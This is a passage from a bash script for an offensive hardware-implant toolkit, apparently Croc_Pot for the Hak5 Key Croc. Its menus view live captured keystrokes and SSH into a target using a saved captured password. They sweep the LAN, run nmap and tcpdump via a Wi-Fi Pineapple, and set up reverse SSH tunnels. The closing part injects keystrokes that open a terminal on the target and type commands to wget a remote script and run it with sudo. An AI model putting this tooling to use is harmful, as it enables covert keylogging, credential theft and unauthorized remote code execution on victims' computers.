	MenuTitle 'KEYCROC STATUS MENU'
	MenuColor 27 1 'MEMORY USAGE'
	MenuColor 27 2 'CPU LOAD'
	MenuColor 27 3 'NETWORK-CONNECTIONS'
	MenuColor 27 4 'KERNEL VERSION'
	MenuColor 27 5 'RUNNING PROCESSES'
	MenuColor 27 6 'CHECK ALL'
	MenuColor 27 7 'TARGET INFO'
	MenuColor 27 8 'VIEW/LIVE KEYSTROKES'
	MenuColor 27 9 'START NMON MONITORING'
	MenuColor 26 10 'LIST MATCH PAYLOADS WORDS'
	MenuColor 26 11 'CHECK LOCAL WEATHER'
	MenuColor 26 12 'START TOP INFORMATION'
	MenuColor 26 13 'CHEAT SHEET BASH/PYTHON/JS'
	MenuColor 26 14 'INSTALL/START IPTRAF-NG'
	MenuColor 26 15 'RETURN TO MAIN MENU'
	MenuEnd 26
	case "$m_a" in
		1) memory_check ; menu_A ;;
		2) cpu_check ; menu_A ;;
		3) tcp_check ; menu_A ;;
		4) kernel_check ; menu_A ;;
		5) processes_check ; menu_A ;;
		6) all_checks ; menu_A ;;
		7) pc_info ; menu_A ;;
		8) key_file ;;
		9) nmon_system ; menu_A ;;
		10) list_match ; menu_A ;;
		11) check_weather ; menu_A ;;
		12) top_croc ; menu_A ;;
		13) cheat_sheet ; menu_A ;;
		14) iptraf_ng ; menu_A ;;
		15) main_menu ;;
		0) exit ;;
		lock) Lock_keyboard ; menu_A ;;
		[pP]) Panic_button ;; [bB]) main_menu ;; *) invalid_entry ; menu_A ;;
	esac
}
menu_A
}
##
#----Edit keycroc Files with nano or vim menu/Function
##
function croc_edit_menu() {
	tput civis
	Info_Screen '-Edit keycroc files with nano or vim
-Select ATTACKMODE MODE'
##
#----Count Files and Directories on keycroc
##
	if [ -f "$tmp_file" ]; then
		ColorYellow "Number of Directories: $(ColorGreen "$count")\n"
		ColorYellow "Total number of Files: $(ColorGreen "$total_files")\n"
	else
		count=0
		total_files=0
		tmp_file=$(mktemp)
		for dir in /{,bin,boot,dev,etc,home,lib,lost+found,media,mnt,proc,root,run,sbin,srv,sys,tmp,usr,var,opt}/*; do
			count=$((count + 1))
			files=$(find "$dir" -type f 2>/dev/null | wc -l)
			total_files=$((total_files + files))
			echo "$count $total_files" > "$tmp_file"
		done & displaySpinner 'Counting Files and Directories one moment please...'
		count=$(awk '{print $1}' "$tmp_file")
		total_files=$(awk '{print $2}' "$tmp_file")
		ColorYellow "Number of Directories: $(ColorGreen "$count")\n"
		ColorYellow "Total number of Files: $(ColorGreen "$total_files")\n"
	fi
##
#----Edit menu- Select editor to use in terminal
##
	echo -ne "\e[38;5;19;1;48;5;245m SELECT AN EDITOR [N]-NANO [V]-VIM ${clear}" ; read -r -n1 r_a
	case "$r_a" in
		[nN])
			ColorYellow "\rEditor:$(ColorGreen ' Nano ')$(ColorYellow 'Version: ')$(ColorGreen "$(nano --version | head -1 | sed -e 's|^[^0-9]*||' -e 's| .*||')")\033[0K\r\n"
			EDITOR="nano" ;;
		[vV])
			ColorYellow "\rEditor:$(ColorGreen ' Vim ')$(ColorYellow 'Version: ')$(ColorGreen "$(vim --version | head -1 | sed -e 's|^[^0-9]*||' -e 's| .*||')")\033[0K\r\n"
			EDITOR="vim" ;;
		*)
			ColorYellow "\rEditor:$(ColorGreen ' Nano ')$(ColorYellow 'Version: ')$(ColorGreen "$(nano --version | head -1 | sed -e 's|^[^0-9]*||' -e 's| .*||')")\033[0K\r\n"
			EDITOR="nano" ;;
	esac
##
#----Edit menu- open selected files
##
edit_all() {
	f="$(find "$1" -type f -name "*")" ; ColorGreen "$f\n"
	read_all 'ENTER THE FILE NAME TO EDIT AND PRESS [ENTER]'
	if [ -f "$r_a" ]; then
		"$EDITOR" "$r_a"
	else
		invalid_entry
	fi
	croc_edit_menu
}
##
#----Edit menu- remove file from keycroc
##
remove_file() {
	for dir in {bin,boot,dev,etc,home,lib,lost+found,media,mnt,proc,root,run,sbin,srv,sys,tmp,usr,var,opt}; do
		count=$(find "/$dir" -type f 2>/dev/null | wc -l)
		if [ $? -eq 0 ]; then
			ColorYellow "Directory:$(ColorCyan " /$dir ")$(ColorYellow 'Contains:')$(ColorGreen " $count ")$(ColorYellow 'files.')\n"
		fi
	done
	read_all 'ENTER THE DIRECTORY NAME TO VIEW FILES AND PRESS [ENTER]' ; local f_n="$r_a"
	f="$(find /"$f_n" -type f -name "*")" ; ColorRed "$f\n"
	read_all 'ENTER THE FILE NAME TO BE REMOVE AND PRESS [ENTER]' ; local r_f="$r_a"
	if [ -f "$r_f" ]; then
		ColorRed "This file will be removed $r_f\n"
		read_all 'REMOVE FILE Y/N AND PRESS [ENTER]'
		case "$r_a" in
			[yY] | [yY][eE][sS])
				LED R
				ColorRed "Removing this file $r_f\n"
				rm -f "$r_f" ;;
			[nN] | [nN][oO])
				LED B
				ColorYellow "Did not make any changes\n" ;;
			*)
				invalid_entry ;;
		esac
	else
		invalid_entry
	fi
	croc_edit_menu
}
##
#----Edit menu- search directory select file to Edit on keycroc
##
user_edit() {
	for dir in {bin,boot,dev,etc,home,lib,lost+found,media,mnt,proc,root,run,sbin,srv,sys,tmp,usr,var,opt}; do
		count=$(find "/$dir" -type f 2>/dev/null | wc -l)
		if [ $? -eq 0 ]; then
			ColorYellow "Directory:$(ColorCyan " /$dir ")$(ColorYellow 'Contains:')$(ColorGreen " $count ")$(ColorYellow 'files.')\n"
		fi
	done
	read_all 'ENTER THE DIRECTORY NAME TO VIEW FILES AND PRESS [ENTER]' ; local r_f="$r_a"
	f="$(find /"$r_f" -type f -name "*")" ; ColorGreen "$f\n"
	read_all 'ENTER THE FILE NAME TO EDIT AND PRESS [ENTER]'
	if [ -f "$r_a" ]; then
		"$EDITOR" "$r_a"
	else
		invalid_entry
	fi
	croc_edit_menu
}
##
#----Edit menu- midnight commander, visual file manager
##
midnight_manager() {
	Info_Screen '-GNU Midnight Commander is a visual file manager
-More details at https://midnight-commander.org'
##
#----Edit menu- midnight install function
##
mc_install() {
	install_package mc MIDNIGHT_COMMANDER
}
##
#----Edit menu- midnight remove function
##
mc_remove() {
	read_all 'REMOVE MIDNIGHT COMMANDER Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			apt-get remove mc
			apt-get autoremove
			ColorGreen 'MIDNIGHT COMMANDER IS NOW REMOVED' ;;
		[nN] | [nN][oO])
			ColorYellow 'KEEPING MIDNIGHT COMMANDER' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Midnight Menu
##
	MenuTitle 'MIDNIGHT COMMANDER MENU'
	MenuColor 26 1 'INSTALL MIDNIGHT COMMANDER'
	MenuColor 26 2 'REMOVE MIDNIGHT COMMANDER'
	MenuColor 26 3 'START MIDNIGHT COMMANDER'
	MenuColor 26 4 'RETURN TO MAIN MENU'
	MenuEnd 25
	case "$m_a" in
		1) mc_install ; midnight_manager ;;
		2) mc_remove ; midnight_manager ;;
		3) mc ; midnight_manager ;;
		4) main_menu ;;
		0) exit ;;
		lock) Lock_keyboard ; midnight_manager ;;
		[pP]) Panic_button ;; [bB]) croc_edit_menu ;; *) invalid_entry ; midnight_manager ;;
	esac
}
##
#----Edit menu
##
	MenuTitle 'CROC EDIT MENU'
	MenuColor 22 1 'CROC PAYLOADS FOLDER' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 22 8 'ATTACKMODE HID' | sed 's/\t//g'
	MenuColor 22 2 'CROC TOOLS FOLDER' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 22 9 'RELOAD PAYLOADS' | sed 's/\t//g'
	MenuColor 22 3 'CROC LOOT FOLDER' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 10 'ATTACKMODE OFF' | sed 's/\t//g'
	MenuColor 22 4 'CROC CONFIG FILE' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 11 'ARMING MODE' | sed 's/\t//g'
	MenuColor 22 5 'CROC ENTER FILE NAME' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 12 'ATTACKMODE RO STORGE' | sed 's/\t//g'
	MenuColor 22 6 'CROC REMOVE FILES' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 13 'ATTACKMODE ETHERNET' | sed 's/\t//g'
	MenuColor 22 7 'ATTACKMODE STORAGE' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 14 'MIDNIGHT MANAGER' | sed 's/\t//g'
	MenuColor 21 15 'RETURN TO MAIN MENU'
	MenuEnd 21
	case "$m_a" in
		1) edit_all /root/udisk/payloads ;;
		2) edit_all /root/udisk/tools ;;
		3) edit_all /root/udisk/loot ;;
		4) "$EDITOR" /root/udisk/config.txt ; croc_edit_menu ;;
		5) user_edit ;;
		6) remove_file ;;
		7) ATTACKMODE HID STORAGE ; croc_edit_menu ;;
		8) ATTACKMODE HID ; croc_edit_menu ;;
		9) RELOAD_PAYLOADS ; croc_edit_menu ;;
		10) ATTACKMODE OFF ; croc_edit_menu ;;
		11) ARMING_MODE ; croc_edit_menu ;;
		12) ATTACKMODE RO_STORGE ; croc_edit_menu ;;
		13) ATTACKMODE HID AUTO_ETHERNET ; croc_edit_menu ;;
		14) midnight_manager ;;
		15) main_menu ; tput civis ;;
		0) exit ;;
		lock) Lock_keyboard ; croc_edit_menu ;;
		[pP]) Panic_button ;; [bB]) main_menu ; tput civis ;; *) invalid_entry ; croc_edit_menu ;;
	esac
}
##
#----Croc_Pot SSH menu/functions
##
function ssh_menu() {
##
#----SSH menu Install sshpass/check active SSH connection
##
	install_package sshpass SSHPASS
	systemctl status sshd.service
#
#----Check and start ssh to hak5 device
#
ip_check_ssh() {
	ping -q -c 1 -w 1 "$1" &>/dev/null 2>&1
	if [[ $? -ne 0 ]]; then
		ping -q -c 1 -w 1 "$2" &>/dev/null 2>&1
		if [[ $? -ne 0 ]]; then
			ColorRed "Can not start SSH connect on: $2\n"
		elif [[ "${#args[@]}" -eq 0 ]]; then
			ssh -o "StrictHostKeyChecking no" root@"$2"
		fi
	elif [[ "${#args[@]}" -eq 0 ]]; then
		ssh -o "StrictHostKeyChecking no" root@"$1"
	else
		ColorRed "Can not start SSH connect on: '1\n"
	fi
} 2>/dev/null
##
#----SSH check devices for connection
##
check_device() {
	ping -q -c 1 -w 1 "$1" &>/dev/null 2>&1
	if [[ $? -ne 0 ]]; then
		ping -q -c 1 -w 1 "$DEFAULT_IP" &>/dev/null 2>&1
		if [[ $? -ne 0 ]]; then
			:
		elif [[ "${#args[@]}" -eq 0 ]]; then
			echo -ne "\e[38;5;19;4;1;48;5;245m${@:2}$clear${yellow}:$clear${green}ONLINE$clear${yellow} IP:$clear$green$(ping -q -c 1 -w 1 "$DEFAULT_IP" | sed -nE 's/^PING[^(]+\(([^)]+)\).*/\1/p')$clear" ; get_mac "$1" ; port_check "$1"
		fi
	elif [[ "${#args[@]}" -eq 0 ]]; then
		echo -ne "\e[38;5;19;4;1;48;5;245m${@:2}$clear${yellow}:$clear${green}ONLINE$clear${yellow} IP:$clear$green$(ping -q -c 1 -w 1 "$1" | sed -nE 's/^PING[^(]+\(([^)]+)\).*/\1/p')$clear" ; get_mac "$1" ; port_check "$1"
	fi
} 2>/dev/null
##
#----SSH check default ip
##
default_ip() {
	unset DEFAULT_IP
	DEFAULT_IP="$1"
}
##
#----SSH shark jack get ip from Croc_Pot_Payload
##
shark_check() {
	local SHARK_IP=/root/udisk/tools/Croc_Pot/shark_ip.txt
	if [ -f "$SHARK_IP" ]; then
		if [[ "$(sed -n '1p' ${SHARK_IP})" =~ $validate_ip ]]; then
			default_ip "$(sed -n '1p' "$SHARK_IP")"
		else
			default_ip 172.16.24.1
		fi
	fi 2>/dev/null
}
##
#----SSH LAN TURTLE get ip from Croc_Pot_Payload
##
turtle_check() {
	local TURTLE_IP=/root/udisk/tools/Croc_Pot/turtle_mac.txt
	if [ -f "$TURTLE_IP" ]; then
		if [[ "$(sed -n '1p' ${TURTLE_IP})" =~ $validate_ip ]]; then
			default_ip "$(sed -n '1p' "$TURTLE_IP")"
		else
			default_ip 172.16.84.1
		fi
	fi 2>/dev/null
}
##
#----SSH check port 22 open or closed
##
port_check() {
	nc -vz -v -w 1 "$1" 22 &>/dev/null 2>&1
	if [[ $? -ne 0 ]]; then
		nc -vz -v -w 1 "$DEFAULT_IP" 22 &>/dev/null 2>&1
		if [[ $? -ne 0 ]]; then
			ColorYellow " PORT:$(ColorRed '22 CLOSED')\n"
			unset DEFAULT_IP
		elif [[ "${#args[@]}" -eq 0 ]]; then
			ColorYellow " PORT:$(ColorGreen '22 OPEN')\n"
			unset DEFAULT_IP
		fi
	elif [[ "${#args[@]}" -eq 0 ]]; then
		ColorYellow " PORT:$(ColorGreen '22 OPEN')\n"
	fi 2>/dev/null
}
##
#----SSH get mac addresses
##
get_mac() {
	arp -n "$1" &>/dev/null 2>&1
	if [[ $? -ne 0 ]]; then
		if [[ "$save_mac" =~ ^([[:xdigit:]][[:xdigit:]]:){5}[[:xdigit:]][[:xdigit:]]$ ]]; then
			ColorYellow " MAC:$(ColorGreen "$save_mac")"
			unset save_mac
		else
			:
		fi
	elif [[ "${#args[@]}" -eq 0 ]]; then
		ColorYellow " MAC:$(ColorGreen "$(arp "$1" | awk '{print $3}' | sed -e 's/HWaddress//g' | sed '/^[[:space:]]*$/d')")"
	fi 2>/dev/null
}
##
#----SSH check for saved mac address
##
saved_mac() {
	if [ -e "$1" ]; then
		save_mac=$(sed -n "$2" "$1")
	fi 2>/dev/null
}
##
#----SSH check for saved mac address for windows
##
saved_mac_win() {
	if [ -e "$1" ]; then
		save_mac=$(cat /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt | grep -iPo \^\.*[[:xdigit:]][[:xdigit:]]:[[:xdigit:]]\.\*\$ | sed -n '/[[:xdigit:]]::/!p' | sed -n '/[[:xdigit:]][[:xdigit:]][[:xdigit:]]:/!p' | cut -d " " -f1 | awk 'FNR <= 1' | sed -e 's/\(.*\)/\L\1/')
	fi
}
##
#----SSH check for saved bash bunny mac address
##
bunny_mac() {
	if [ "$(OS_CHECK)" = WINDOWS ]; then
		sed -i 's/-/:/g' /root/udisk/tools/Croc_Pot/bunny_mac.txt
		local bunny_v=$(sed -n 1p /root/udisk/tools/Croc_Pot/bunny_mac.txt)
	elif [ "$(OS_CHECK)" = LINUX ]; then
		local bunny_v=$(sed -n 1p /root/udisk/tools/Croc_Pot/bunny_mac.txt)
	fi 2>/dev/null
	if [[ "$(sed -n 1p /root/udisk/tools/Croc_Pot/bunny_mac.txt)" =~ ^([[:xdigit:]][[:xdigit:]]:){5}[[:xdigit:]][[:xdigit:]]$ ]]; then
		local bunny_s=$(sed -n 30p /root/udisk/tools/Croc_Pot/Bunny_Payload_Shell/payload.txt | sed -e 's/ssh -fN -R \(.*\):localhost:22/\1/' | awk '{print $5}')
		echo -ne "\e[38;5;19;4;1;48;5;245mBASH BUNNY$clear${yellow}:$clear${green}TUNNEL ${clear}${yellow}IP:$clear${green}172.16.64.1$clear${yellow} MAC:$clear$green${bunny_v}$clear${yellow} PORT:$clear$green${bunny_s}$clear\n"
	else
		:
	fi 2>/dev/null
}
##
#----SSH check for save VPS server
##
if [ -f "/root/udisk/tools/Croc_Pot/saved_shell.txt" ]; then
	remote_vps=$(sed -n 1p /root/udisk/tools/Croc_Pot/saved_shell.txt)
fi 2>/dev/null
##
#----SSH check current SSID
##
ssid_check() {
	local ss_id=$(iw dev wlan0 scan | grep -E "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sed -n '/'"$(sed -n -e 's/^WIFI_SSID //p' /root/udisk/config.txt)"'/p')
	local gateway=$(route -n | grep "UG" | grep -v "UGH" | cut -f 10 -d " ")
	local mask=$(/sbin/ifconfig wlan0 | awk '/Mask:/{ print $4;}' | sed 's/Mask:/'\\"${yellow}"NETMASK:\\"${clear}"\\"${green}"'/g')
	echo -ne "\e[38;5;19;4;1;48;5;245mSSID     $clear$yellow:$clear$green${ss_id^^}$clear${yellow} GATEWAY IP:$clear$green$gateway $clear$mask$clear\n"
}
##
#----SSH check if screen crab connected to network
##
screen_crab() {
	local t_ip=$(route -n | grep "UG" | grep -v "UGH" | cut -f 10 -d " " | sed -r 's/.{1}$//')
	for crab in {1..254} ;do (ping -q -c 1 -w 1 "$t_ip""$crab" >/dev/null &) ;done
	local crab_host=$(arp -a | sed -n 's/\(android-[0-9]*\+.\+lan\)/\1/p' | awk '{print $1}')
	local crab_ip=$(arp -a | sed -n 's/\(android-[0-9]*\+.\+lan\)/\1/p' | awk '{print $2}' | sed 's/[(),]//g')
	if [[ "$crab_ip" =~ $validate_ip ]]; then
		check_device "$crab_ip" SCREEN CRAB
	fi
}
##
#----SSH check signal owl connected to network
##
owl_check() {
#----place Owl mac here
	local OWL_MAC=00:00:00:00:00:00
	local OWL_IP=$(arp -a | sed -ne '/'${OWL_MAC}'/p' | sed -e 's/.*(\(.*\)).*/\1/')
	if [[ "$OWL_IP" =~ $validate_ip ]]; then
		IP_O=$OWL_IP
	else
		IP_O=172.16.56.1
	fi
}
##
#----SSH display info screen
##
	Info_Screen '-SSH into HAK5 gear and TARGET
-Reverse ssh tunnel, Create SSH Public/Private Key
-Ensure devices are connected to the same local network As keycroc'
user_agent_random
local croc_mac=$(cat /sys/class/net/$(ip route show default | awk '/default/ {print $5}')/address)
local croc_city=$(curl -Lsf -A "$userAgent" --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=city)
local croc_country=$(curl -Lsf -A "$userAgent" --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=country)
local croc_region=$(curl -Lsf -A "$userAgent" --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=region)
local croc_isp=$(curl -Lsf -A "$userAgent" --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=isp | awk '{print $1}')
check_device "$(os_ip)" TARGET
echo -ne "\e[38;5;19;4;1;48;5;245mPUBLIC IP$clear${yellow}:$clear$green$(curl -s -A "$userAgent" --connect-timeout 2 --max-time 2 https://checkip.amazonaws.com) $clear${yellow}COUNTRY:$clear$green${croc_country^^} $clear${yellow}CITY:$clear$green${croc_city^^}$clear${yellow}/$clear$green${croc_region} $clear${yellow}ISP:$clear$green${croc_isp^^}$clear\n"
ssid_check ; check_device croc KEY CROC_ | sed 's/--/'"$croc_mac"'/g'
default_ip 172.16.42.1 ; check_device mk7 WIFI PINEAPPLE7 
saved_mac /root/udisk/tools/Croc_Pot/squirrel_mac.txt 1p ; default_ip 172.16.32.1 ; check_device squirrel PACKET SQUIRREL
sed -i 's/--//g' /root/udisk/tools/Croc_Pot/turtle_mac.txt 2>/dev/null ; saved_mac /root/udisk/tools/Croc_Pot/turtle_mac.txt 2p ; turtle_check ; check_device turtle LAN TURTLE
saved_mac /root/udisk/tools/Croc_Pot/shark_ip.txt 2p ; shark_check ; check_device shark SHARK JACK
#screen_crab ; owl_check ; check_device ${IP_O} SIGNAL OWL_ ; check_device Pineapple.lan WIFI PINEAPPLET
bunny_mac ; check_device "$remote_vps" REMOTE VPS | sed 's/MAC://g' | sed 's/--//g'
echo -ne "\e[48;5;202;30m$LINE$clear\n"
ColorYellow "$(awk -v m=80 '{printf("%-80s\n", $0)}' <<< 'Active SSH connection:')
$(ColorGreen "$(ss | grep -i ssh)\n$(last -a | grep -i still)")\n"
##
#----SSH keycroc to target
##
pc_ssh() {
	ColorYellow "Found save Passwd try this: $(ColorGreen "$(target_pw)")\n"
	if [ -e "/root/udisk/tools/Croc_Pot/Croc_OS_Target.txt" ]; then
		start_ssh() {
			ColorYellow "Target user name: $(ColorGreen "$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)")\n"
			ColorYellow "Target IP: $(ColorGreen "$(os_ip)")\n"
			ColorGreen "Starting SSH with Target$clear\n"
			if [ -e "/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered" ]; then
				sshpass -p "$(target_pw)" ssh -o "StrictHostKeyChecking no" "$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)"@"$(os_ip)"
			else
				ssh -o "StrictHostKeyChecking no" "$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)"@"$(os_ip)"
			fi
		}
		case "$(OS_CHECK)" in
			WINDOWS)
				start_ssh ;;
			LINUX)
				start_ssh ;;
			MACOS)
				ColorRed 'SORRY NO SUPPORT AT THIS TIME FOR MAC USERS\n' ;;
			*)
				ColorRed 'SORRY DID NOT FIND VALID OS\n' ;;
		esac
	else
		ColorYellow 'PLEASE RUN CROC_POT_PAYLOAD.TXT TO GET TARGET IP/USERNAME\n'
	fi
}
##
#----SSH Reachable target on local network
##
reachable_target() {
	local t_ip=$(route -n | grep "UG" | grep -v "UGH" | cut -f 10 -d " " | sed -r 's/.{1}$//')
	for i in {1..254}; do (ping -q -c 1 -w 1 "$t_ip$i" >/dev/null && ColorGreen "$t_ip$i\n" &); done
	ip n | grep -i reach | sed -r 's/\b(dev|lladdr)\b//g'
}
##
#----SSH enter user/ip to start ssh
##
userinput_ssh() {
	read_all 'ENTER THE HOST NAME FOR SSH AND PRESS [ENTER]' ; SSH_USER="$r_a"
	read_all 'ENTER THE IP FOR SSH AND PRESS [ENTER]' ; SSH_IP="$r_a"
	ssh -o "StrictHostKeyChecking no" "$SSH_USER"@"$SSH_IP"
}
##
#----SSH wifi pineapple menu/function
##
ssh_pineapple() {
	Info_Screen '-Wi-Fi Pineapple Mk7 example/preset command'
	ping -q -c 1 -w 1 mk7 &>/dev/null 2>&1
if [[ $? -ne 0 ]]; then
	ColorRed '\nDid not detect Wi-Fi Pineapple Mk7\n'
	ssh_menu
elif [[ "${#args[@]}" -eq 0 ]]; then
##
#----SSH Wi-Fi Pineapple Mk7 kismet LED lights random/off/reset/custom
##
pineapple_led() {
	Info_Screen '-Wi-Fi Pineapple Mk7 Kismet LED example command
-Kismet LED Mod command--> LEDMK7 --help
-Reset color command--> LEDMK7 -r
-Trun LED off command--> LEDMK7 -0 0,0,0 -1 0,0,0 -2 0,0,0 -3 0,0,0
-Each LED is set to a Hue color 0-360, Saturation 0-255, and brightness 0-255
-More info at https://www.kismetwireless.net/mk7-led-mod'
##
#----SSH Wi-Fi Pineapple Mk7 kismet led random light
##
kismet_random() {
	read_all 'RANDOM MK7 KISMET LED LIGHT Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			Countdown 1 15 & for i in {1..10}; do ssh root@mk7 LEDMK7 -a $(( RANDOM % 360 )),$(( RANDOM % 255 )) -b $(( RANDOM % 360 )),$(( RANDOM % 255 )); sleep 5; ssh root@mk7 LEDMK7 -r; sleep 1; done
			ssh root@mk7 LEDMK7 -r
			Countdown 1 15 & for i in {1..10}; do ssh root@mk7 LEDMK7 -p $(( RANDOM % 360 )),$(( RANDOM % 255 )),$(( RANDOM % 255 )); sleep 5; ssh root@mk7 LEDMK7 -r; sleep 1; done
			ssh root@mk7 LEDMK7 -r
			Countdown 1 15 & for i in {1..10}; do ssh root@mk7 LEDMK7 -0 $(( RANDOM % 360 )),$(( RANDOM % 255 )),$(( RANDOM % 255 )) -1 $(( RANDOM % 255 )),$(( RANDOM % 255 )),$(( RANDOM % 255 )) -2 $(( RANDOM % 255 )),$(( RANDOM % 255 )),$(( RANDOM % 255 )) -3 $(( RANDOM % 255 )),$(( RANDOM % 255 )),$(( RANDOM % 255 )); sleep 5; ssh root@mk7 LEDMK7 -r; sleep 1; done
			ssh root@mk7 LEDMK7 -r ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----SSH Wi-Fi Pineapple Mk7 kismet LED lights custom
##
kismet_custom() {
	read_all 'ENTER FIRST COLOR CODE AND PRESS [ENTER]' ; local first_color="$r_a"
	read_all 'ENTER FIRST BRIGHTNESS CODE AND PRESS [ENTER]' ; local first_bright="$r_a"
	read_all 'ENTER SECOND COLOR CODE AND PRESS [ENTER]' ; local second_color="$r_a"
	read_all 'ENTER SECOND BRIGHTNESS CODE AND PRESS [ENTER]' ; local second_bright="$r_a"
	ssh root@mk7 LEDMK7 -a "$first_color","$first_bright" -b "$second_color","$second_bright"
}
##
#----SSH wifi pineapple kismet led mod menu
##
	MenuTitle 'MK7 KISMET LED MOD MENU'
	MenuColor 19 1 'RANDOM LED'
	MenuColor 19 2 'RESTORE LED'
	MenuColor 19 3 'TRUN OFF LED'
	MenuColor 19 4 'CUSTOM LED'
	MenuColor 19 5 'RETURN TO MAIN MENU'
	MenuEnd 18
	case "$m_a" in
		1) kismet_random ; pineapple_led ;;
		2) ssh root@mk7 'LEDMK7 -r' ; pineapple_led ;;
		3) ssh root@mk7 'LEDMK7 -0 0,0,0 -1 0,0,0 -2 0,0,0 -3 0,0,0' ; pineapple_led ;;
		4) kismet_custom ; pineapple_led ;;
		5) main_menu ;;
		0) exit ;;
		lock) Lock_keyboard ; pineapple_led ;;
		[pP]) Panic_button ;; [bB]) ssh_pineapple ;; *) invalid_entry ; pineapple_led ;;
	esac
}
##
#----SSH wifi pineapple menu
##
	MenuTitle 'WIFI PINEAPPLE MENU'
	MenuColor 19 1 'SSH PINEAPPLE'
	MenuColor 19 2 'PINEAPPLE WEB'
	MenuColor 19 3 'MK7 LED MOD MENU'
	MenuColor 19 4 'MK7 STATUS/INFO'
	MenuColor 19 5 'MK7 TCPDUMP'
	MenuColor 19 6 'ENTER COMMAND'
	MenuColor 19 7 'RETURN TO MAIN MENU'
	MenuEnd 18
	case "$m_a" in
		1) ip_check_ssh mk7 172.16.42.1 ; ssh_pineapple ;;
		2) start_web http://172.16.42.1:1471 ; ssh_pineapple ;;
		3) pineapple_led ;;
		4) ssh root@mk7 'uname -a ; uptime' ; echo "$LINE" ; ssh root@mk7 ifconfig ; echo "$LINE" ; ssh root@mk7 netstat -tunlp ; echo "$LINE" ; ssh root@mk7 ps -aux ; echo "$LINE"
		ssh root@mk7 iw dev wlan0 scan | grep -E "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sort ; sleep 2 ; echo "$LINE"
		ssh root@mk7 nmap -Pn -sS -T 3 172.16.42.1/24 ; echo "$LINE" ; ssh_pineapple ;;
		5) ssh root@mk7 tcpdump -XX -i any ; ssh_pineapple ;;
		6) read_all 'ENTER COMMAND AND PRESS [ENTER]' ; local USER_COMMAND="$r_a"
		ssh root@mk7 "$USER_COMMAND" ; sleep 5 ; ssh_pineapple ;;
		7) main_menu ;;
		0) exit ;;
		lock) Lock_keyboard ; ssh_pineapple ;;
		[bB]) ssh_menu ;; [pP]) Panic_button ;; *) invalid_entry ; ssh_pineapple ;;
	esac
fi
}
##
#----SSH to packet squirrel
##
ssh_squirrel() {
	ip_check_ssh squirrel 172.16.32.1
}
##
#----SSH to lan turtle
##
ssh_turtle() {
	local TURTLE_IP=/root/udisk/tools/Croc_Pot/turtle_mac.txt
	if [ -f "$TURTLE_IP" ]; then
		if [[ "$(sed -n '1p' $TURTLE_IP)" =~ $validate_ip ]]; then
			ip_check_ssh "$(sed -n '1p' "$TURTLE_IP")" turtle
		else
			ip_check_ssh turtle 172.16.84.1
		fi
	fi 2>/dev/null
}
##
#----SSH to signal owl
##
ssh_owl() {
	ip_check_ssh $IP_O 172.16.56.1
}
##
#----SSH to shark jack
##
ssh_shark() {
	local SHARK_IP=/root/udisk/tools/Croc_Pot/shark_ip.txt
	if [ -f "$SHARK_IP" ]; then
		if [[ "$(sed -n '1p' "$SHARK_IP")" =~ $validate_ip ]]; then
			ip_check_ssh "$(sed -n '1p' "$SHARK_IP")" shark
		else
			ip_check_ssh shark 172.16.24.1
		fi
	fi 2>/dev/null
}
##
#----SSH to bash bunny
##
ssh_bunny() {
	Info_Screen '-Start ssh with Target to Bash bunny or
-Start REVERSE SSH Tunnel with keycroc to bash bunny
-Will need to install a small payload onto bash bunny
-This will create the payload for the bash bunny and save it to tools folder
-Place this in one of the bunny payloads switchs folder this is needed for
reverse ssh tunnel From bunny to keycroc
-Ensure bash bunny is connected to target
-Ensure bash bunny has internet connection
-Recommend to setup public and private keys on both bunny & Croc'
	local bunny_payload=/root/udisk/tools/Croc_Pot/Bunny_Payload_Shell
	local bunny_payload_v=/root/udisk/tools/Croc_Pot/Bunny_Payload_Shell/payload.txt
##
#----Connect bunny to target network linux only
##
if [ "$(OS_CHECK)" = LINUX ]; then
	read_all 'CONNECT BUNNY TO TARGET NETWORK Y/N AND PRESS [ENTER]'
	case "$r_a" in
	[yY] | [yY][eE][sS])
		case "$HOST_CHECK" in
		raspberrypi)
			QUACK CONTROL-ALT-t ; sleep 1 ; QUACK STRING "i=\$(whoami)" ; QUACK ENTER ; QUACK STRING "if [ -e /home/\${i}/bb.sh ]; then"
			QUACK ENTER ; QUACK STRING "echo \"bb.sh is installed\"" ; QUACK ENTER ; QUACK STRING "else" ; QUACK ENTER ; QUACK STRING "echo \"installing bb.sh\"" ; QUACK ENTER
			QUACK STRING "wget bashbunny.com/bb.sh" ; QUACK ENTER ; QUACK STRING "fi" ; QUACK ENTER ; sleep 2 ; QUACK STRING "sudo bash ./bb.sh" ; QUACK ENTER ; sleep 3
			QUACK STRING "c" ; sleep 2 ; QUACK STRING "exit" ; QUACK ENTER ; QUACK ALT-TAB ;;
		"$HOST_CHECK")
			QUACK ALT-t ; QUACK ENTER ; sleep 1 ; QUACK STRING "i=\$(whoami)" ; QUACK ENTER ; QUACK STRING "if [ -e /home/\${i}/bb.sh ]; then"
